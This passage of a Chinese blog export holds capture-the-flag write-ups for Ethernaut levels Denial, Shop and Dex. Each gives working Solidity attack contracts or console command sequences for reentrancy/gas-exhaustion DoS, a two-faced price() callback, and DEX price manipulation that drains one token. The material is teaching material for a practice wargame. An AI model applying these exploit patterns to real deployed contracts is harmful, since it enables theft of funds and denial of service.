partner.call.value(amountToSend)(\"\"); owner.transfer(amountToSend); // keep track of last withdrawal time timeLastWithdrawn = now; withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend); } // allow deposit of funds fallback() external payable {} // convenience function function contractBalance() public view returns (uint) { return address(this).balance; } } 合约分析：从合约的代码中我们很容易发现这里存在一个重入漏洞，所以可以通过部署了一个利用重入漏洞的合约，把gas直接消耗光，那么owner 自然收不到钱了，从而造成DOS。 可以使 transfer 失败，也就是把 gas 耗光 使用 assert 失败的话，将会 spend all gas ，这样的话 owner.transfer(amountToSend) 将执行失败 这里还有一个很明显的重入漏洞 partner.call.value(amountToSend)() ，利用重入漏洞把 gas 消耗完，应该也可以达到目的 主要思路是，让合约在执行时消耗完所有 gas，交易失败。所以我们可以构建这样的攻击合约 顺带提一下把gas耗光的情况，assert 函数触发异常之后会消耗所有可用的 gas，消耗了所有的 gas 那就没法转账了 pragma solidity ^0.4.23; contract Denial { address public partner; address public constant owner = 0xA9E; uint timeLastWithdrawn; mapping(address =&gt; uint) withdrawPartnerBalances; function setWithdrawPartner(address _partner) public { partner = _partner; } function withdraw() public { uint amountToSend = address(this).balance/100; partner.call.value(amountToSend)(); owner.transfer(amountToSend); timeLastWithdrawn = now; withdrawPartnerBalances[partner] += amountToSend; } function() payable {} function contractBalance() view returns (uint) { return address(this).balance; } } contract Attack{ address instance_address = 题目合约地址; Denial target = Denial(instance_address); function hack() public { target.setWithdrawPartner(address(this)); target.withdraw(); } function () payable public { assert(0==1); } } 攻击流程：1、获取新实例， 2、部署合约，复制合约中的地址 pragma solidity ^0.4.23; contract Denial { address public partner; address public constant owner = 0xA9E; uint timeLastWithdrawn; mapping(address =&gt; uint) withdrawPartnerBalances; function setWithdrawPartner(address _partner) public { partner = _partner; } function withdraw() public { uint amountToSend = address(this).balance/100; partner.call.value(amountToSend)(); owner.transfer(amountToSend); timeLastWithdrawn = now; withdrawPartnerBalances[partner] += amountToSend; } function() payable {} function contractBalance() view returns (uint) { return address(this).balance; } } contract Attack{ address instance_address = 题目合约地址; Denial target = Denial(instance_address); function hack() public { target.setWithdrawPartner(address(this)); target.withdraw(); } function () payable public { target.withdraw(); } } 3、编译运行，直接hack 4、直接提交就行","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Shop第21关练习","slug":"Ethernaut/21.Ethernaut-Shop","date":"2021-07-16T18:24:00.000Z","updated":"2021-08-02T11:08:38.239Z","comments":true,"path":"/Ethernaut/Ethernaut/21.Ethernaut-Shop/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/Ethernaut/21.Ethernaut-Shop/","excerpt":"","text":"Shop第21关练习要求：实现一个函数，使得两次调用返回值不同 要求是修改 price 低于 100， 那就第一次返回大于100，第二次返回小于100。 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; interface Buyer { function price() external view returns (uint); } contract Shop { uint public price = 100; bool public isSold; function buy() public { Buyer _buyer = Buyer(msg.sender); if (_buyer.price.gas(3000)() &gt;= price &amp;&amp; !isSold) { isSold = true; price = _buyer.price.gas(3000)(); } } } 合约分析：本关原理跟11. Elevator相差不大，关卡合約中分別呼叫了两次Buyer合约的price函数，只要第二次呼叫回传的数字比第一次呼叫回传的数字小即可。 本来想的是利用 storage 修改，可是修改变量需要 5000 gas，但是关卡合约使用call呼叫price函数是自定义了一个非常少的gas，只有 3000，这个数量不足以更改任何Storage的数值。 观察合约，可以发现两次请求price函数中间有这个代码︰ isSold = true; 因此我们可以利用isSold数值的转变在price函数时候传不同的数字。isSold 是 public 属性，所以可以利用 isSold ，根据 isSold 进行判断，两次调用 _buyer.price.gas(3000)() 第一次返回大于等于 100 ，第二次返回小于 100 即可 因为gas数量实在是太低了，Solidity 0.8有可能会因为版本原因导致gas使用完而失败，因此以下采用Solidity 0.7进行编写。 攻击流程：1、获取新实例，查看合约地址，是否卖出，价格 2、部署合约，复制地址 pragma solidity ^0.5.0; interface Buyer { function price() external view returns (uint); } contract Shop { uint public price = 100; bool public isSold; function buy() public { Buyer _buyer = Buyer(msg.sender); if (_buyer.price.gas(3000)() &gt;= price &amp;&amp; !isSold) { isSold = true; price = _buyer.price.gas(3000)(); } } } interface IShop { function isSold() external view returns (bool); function buy() external; } contract ShopAttack { address levelInstance; constructor(address _levelInstance) public { levelInstance = _levelInstance; } function price() public view returns (uint256) { return IShop(msg.sender).isSold() ? 0 : 100; } function buy() public { IShop(levelInstance).buy(); } } 3、编译执行攻击合约，点击买下来，这里执行成功表示我们是满足了合约要求的3000gas，若不成功表示gas过大 4、检查是否卖出，价格 5、快乐提交吧！","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Dex第22关练习（超详细图片版）","slug":"Ethernaut/22.Ethernaut-Dex","date":"2021-07-16T16:00:00.000Z","updated":"2021-08-02T11:07:20.735Z","comments":true,"path":"/Ethernaut/Ethernaut/22.Ethernaut-Dex/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/Ethernaut/22.Ethernaut-Dex/","excerpt":"","text":"Dex第22关练习（超详细图片版）要求：这个级别的目标是让你破解下面的基本DEX合约，通过价格操纵窃取资金。 玩家最开始有10个Token1和10个Token2，DEX合同最开始有100个Token和100个Token2。 如果让两个Token至少1个被取光，即让至少一个Token为零，并知道这期间会有一个“报错”，您将在该级别获得成功。 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\"; import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\"; import '@openzeppelin/contracts/math/SafeMath.sol'; contract Dex { using SafeMath for uint; address public token1; address public token2; constructor(address _token1, address _token2) public { token1 = _token1; token2 = _token2; } function swap(address from, address to, uint amount) public {//swap()函数 需要传入一个from地址，一个to地址，以及一个余额 require(IERC20(from).balanceOf(msg.sender) &gt;= amount, \"Not enough to swap\");//先会判断玩家对应的from地址的值要&gt;=amount，不然不足以交换 uint swap_amount = get_swap_price(from, to, amount);//定义一个交换的余额值作为to的swap_amount,使用的方式是`get_swap_price` IERC20(from).transferFrom(msg.sender, address(this), amount);//进行from地址的交换 IERC20(to).approve(address(this), swap_amount);//允许to地址的交换 IERC20(to).transferFrom(address(this), msg.sender, swap_amount);//进行to地址的交换 } function add_liquidity(address token_address, uint amount) public{ IERC20(token_address).transferFrom(msg.sender, address(this), amount); } function get_swap_price(address from, address to, uint amount) public view returns(uint){ return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));//通过from和to的地址对应的this(即instance)地址和amount值进行计算出并返回一个新的数值 } function approve(address spender, uint amount) public { SwappableToken(token1).approve(spender, amount); SwappableToken(token2).approve(spender, amount); }//允许合约地址进行交易 function balanceOf(address token, address account) public view returns (uint){ return IERC20(token).balanceOf(account);//查询对应token地址的余额 } } contract SwappableToken is ERC20 { constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) { _mint(msg.sender, initialSupply); } } 合约分析：先了解一下： Decentralized exchange(DEX) ERC20 批准/允许解释 ERC20 Token之间如何“交换”？ 我们的目的是让一个TKN成为0，在官网上也可以看到过关条件 若对**IERC20.sol ** ERC20.sol还不是很了解的话可以参考： IERC20.sol ERC20.sol 回到题目，我们重点需要看这个函数： function get_swap_price(address from, address to, uint amount) public view returns(uint){ return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this))); } 两种Token的合约初始余额均为 100。 利用get_swap_price()计算合约的Token剩余的值。 (amount *IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)) 这将返回相同的交换价格，即 10 个 token1 可以交换 10 个 token2。要破解此方法，必须打破合约代币余额的平衡。须执行以下步骤以产生更高的互换价格 调用approve()函数授权使用token1余额await contract.approve(instance,Number((await contract.balanceOf(token1address, instance)).toString())) 调用approve()函数授权使用token2的余额 await contract.approve(instance,Number((await contract.balanceOf(token2address, instance)).toString())) 调用swap()函数进行交换await contract.swap(token1address,token2address,Number((await contract.balanceOf(token1address, player)).toString())) 调用swap()函数进行交换await contract.swap(token2address,token1address,Number((await contract.balanceOf(token2address, player)).toString())) 现在，token2中的余额是0，token1中的余额是20，利用swap()函数中的get_swap_price()，让他可以用20个token1来交换24个token2, 重复这些步骤，直到将任一代币的合约余额减少到 0。（注意：您可能会收到此错误ERC20: transfer amount exceeds balance。这是因为合约没有足够的余额用于请求的TKN。可以减少互换金额来处理此问题） 攻击流程：1、获取新实例 2、先熟悉我们部署合约的地址 3、分析合约，了解合约内容，发现合约所需要用到的token地址我们并不知道。 4、结合题目，判断Token地址在部署的时候应该会随之存在，于是我们进入钱包找到刚才的合约，进入etherscan中查找我们所需要的内容 右键，将这两个TKN分别在新标签页打开，拿到我们所需要的值 整理一下，我们现在得到了五个地址给我们备用，加上后面我们可能会用到语句，我将他们先放到此处： player '0x34DC7d4F5E3512B66271Ce64198c20DFD8B53897' instance '0xc177418226c51f09E284A91eD20F293CEAce8772' Contract '0xd991431d8b033ddcb84dad257f4821e9d5b38c33' Token 1 '0xe1f647e443710dde0ed501cdb204b59351c13a37' Token 2 '0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6' Token 1 balanceOf await contract.balanceOf('0xe1f647e443710dde0ed501cdb204b59351c13a37',instance或player)//instance和player选择一个 Token 2 balanceOf await contract.balanceOf('0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6',instance或player) Token 1 approve await contract.approve(instance,Number((await contract.balanceOf('0xe1f647e443710dde0ed501cdb204b59351c13a37', instance)).toString())) from Token 2 to Token 1 swap await contract.swap('0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6','0xe1f647e443710dde0ed501cdb204b59351c13a37',Number((await contract.balanceOf('0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6', instance或player)).toString())) from Token 1 to Token 2 swap await contract.swap('0xe1f647e443710dde0ed501cdb204b59351c13a37','0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6',Number((await contract.balanceOf('0xe1f647e443710dde0ed501cdb204b59351c13a37', instance或player)).toString())) get_swap_price await contract.get_swap_price('0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6','0xe1f647e443710dde0ed501cdb204b59351c13a37',Number((await contract.balanceOf('0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6', instance)).toString())) 查看四个值 await [Number((await contract.balanceOf('0xe1f647e443710dde0ed501cdb204b59351c13a37',instance)).toString()),Number((await contract.balanceOf('0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6',instance)).toString()),Number((await contract.balanceOf('0xe1f647e443710dde0ed501cdb204b59351c13a37',player)).toString()),Number((await contract.balanceOf('0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6',player)).toString())] TKN 1-&gt;TKN 2 await contract.swap('0xe1f647e443710dde0ed501cdb204b59351c13a37','0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6',Number((await contract.balanceOf('0xe1f647e443710dde0ed501cdb204b59351c13a37',player)).toString())) await contract.swap('0xe1f647e443710dde0ed501cdb204b59351c13a37','0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6','20') TKN 2-&gt;TKN 1 await contract.swap('0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6','0xe1f647e443710dde0ed501cdb204b59351c13a37',Number((await contract.balanceOf('0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6',player)).toString())) await contract.swap('0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6','0xe1f647e443710dde0ed501cdb204b59351c13a37','20') 当然也可以赋值给TKN1_address这种，好方法都可以 5、准备好了我们开始吧，先查看一下四个的值并记录下来 Start price manipulating... //最开始:TKN1/DEX：合约中的TKN1，TKN2/DEX：合约中的TKN2，TKN1/PLAYER：玩家的TKN1,TKN2/PLAYER：玩家的TKN2 Balances: TKN1/DEX - 100, TKN2/DEX - 100, TKN1/PLAYER - 10, TKN2/PLAYER - 10 Swap price: TKN2 -&gt; TKN1 - '10' Balances: TKN1/DEX - 90, TKN2/DEX - 110, TKN1/PLAYER - 20, TKN2/PLAYER - 0 Swap price: TKN1 -&gt; TKN2 - '20' Balances: TKN1/DEX - 110, TKN2/DEX - 86, TKN1/PLAYER - 0, TKN2/PLAYER - 24 Swap price: TKN2 -&gt; TKN1 - '24' Balances: TKN1/DEX - 80, TKN2/DEX - 110, TKN1/PLAYER - 30, TKN2/PLAYER - 0 Swap price: TKN1 -&gt; TKN2 - '30' Balances: TKN1/DEX - 110, TKN2/DEX - 69, TKN1/PLAYER - 0, TKN2/PLAYER - 41 Swap price: TKN2 -&gt; TKN1 - '41' Balances: TKN1/DEX - 45, TKN2/DEX - 110, TKN1/PLAYER - 65, TKN2/PLAYER - 0 Swap price: TKN1 -&gt; TKN2 - ’‘ Balances: TKN1/DEX - 90, TKN2/DEX - 0, TKN1/PLAYER - 20, TKN2/PLAYER - 110 Swap price: TKN2 -&gt; TKN1 - ’‘ Balances: TKN1/DEX - 90, TKN2/DEX - 0, TKN1/PLAYER - 20, TKN2/PLAYER - 110 6、我们先让TKN1和TKN2进行授权，意思是让合约能够操作110的TKN就可以了 7、我们先让TKN2先与TKN1进行交换，将TKN2/PLAYER - 10全部交换出去，注意对照swap()中的地址，TKN的DEX地址对应TKN的address(this),TKN的PLAYER地址对应的是TKN的msg.sender地址，判断条件是判断的from地址中msg.sender(player)的TKN的的值是否大于amount。 交换成功，四个值都对应的改变了，我们做好记录： 为满足下一个判断条件，我们需要将TKN1先与TKN2进行交换并记录下来（这里需要注意先后顺序，满足判断条件） 继续上述步骤，将TKN2先与TKN1进行交换并记录： 再继续，将TKN1先与TKN2进行交换并记录： 接着继续，将TKN2先与TKN1进行交换并记录： 再继续试试看，将TKN1先与TKN2进行交换并记录： 没错，这里就是题目所提到的错误，我们先拒绝掉这个请求，这里是因为合约没有足够的余额去请求的TKN。可以减少互换金额来处理此问题 7、现在轮到TKN1去跟TKN2交换了，于是我们要满足swap的判断条件，测试用最大的一个数值就行，可以分析判断，因为最开始我们是直接向合约请求的110的授权，所以这里45是刚好满足条件的，如果之前使用的是如下代码，授权的是100，也没关系，可以手动输入测试一下，很快就能够找到最大的一个值了，总之，因为我们使用的是除，类型使用的uint，多试几次绝对能够让一个TKN/DEX变成0， Token 1 approve await contract.approve(instance,Number((await contract.balanceOf('0xe1f647e443710dde0ed501cdb204b59351c13a37', instance)).toString())) 我们使用最快的办法 这时候发现TKN2/DEX变成0了，我们就成功了呀！ 8、快乐提交吧！这类Ethernaut闯关后面还会持续优化一些细节， 有需要的铁子们可以分享给需要的人，哦，对了，铁铁们记得点赞关注投币，一键三连呀！","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"}],"categories":[{"name":"以太坊","slug":"以太坊","permalink":"https://kdlwtrdrgm.github.io/categories/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"},{"name":"区块链","slug":"区块链","permalink":"https://kdlwtrdrgm.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9A%8F%E7%AC%94/"},{"name":"区块链","slug":"区块链","permalink":"https://kdlwtrdrgm.github.io/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}]}